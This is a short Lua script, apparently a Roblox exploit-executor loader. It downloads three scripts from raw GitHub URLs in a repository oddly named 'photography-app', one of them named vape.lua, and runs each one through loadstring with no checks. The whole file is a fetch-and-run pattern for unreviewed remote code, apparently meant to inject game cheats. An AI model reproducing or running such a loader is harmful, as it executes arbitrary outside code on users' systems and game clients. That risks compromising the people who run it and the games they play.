local function executeScript(scriptUrl)
    local script = game:HttpGet(scriptUrl, true)
    local executeFunction = loadstring(script)
    executeFunction()
end

local scripts = {
    "https://raw.githubusercontent.com/farhan-sadiq-mahi/photography-app/main/vape.lua",
    "https://raw.githubusercontent.com/farhan-sadiq-mahi/photography-app/main/txt.lua",
    "https://raw.githubusercontent.com/farhan-sadiq-mahi/photography-app/main/health.lua"
}

for _, scriptUrl in ipairs(scripts) do
    coroutine.wrap(function()
        executeScript(scriptUrl)
    end)()
end
